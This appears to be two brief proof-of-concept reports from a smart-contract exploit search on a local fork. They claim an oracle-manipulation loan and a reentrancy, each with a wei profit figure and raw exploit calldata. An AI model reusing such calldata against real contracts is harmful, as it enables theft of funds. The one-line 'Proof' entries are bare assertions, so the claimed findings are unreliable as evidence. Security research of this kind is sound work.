# PoC Report 1: Oracle Laggard

- **Target:** `Local Fork Test`
- **Profit:** 49000000000000000000 (wei)
- **Calldata:** `0xc5ebeaec000000000000000000000000000000000000000000000002b5e3af16b1880000`

**Proof:**
```
Oracle price was manipulated, causing under‑collateralised loan. Profit: 49000000000000000000 wei
```

---

# PoC Report 2: Return-Oriented Reentrancy

- **Target:** `Local Fork Test`
- **Profit:** 100000000000000000000 (wei)
- **Calldata:** `0x4b3fd1480000000000000000000000000000000000000000000000056bc75e2d63100000000000000000000000000000c664b5b530fa058eb2b52557f4d35ddab5c2c31c`

**Proof:**
```
A reentrancy was found that could be exploited for profit. Profit: 100000000000000000000 wei
```

---

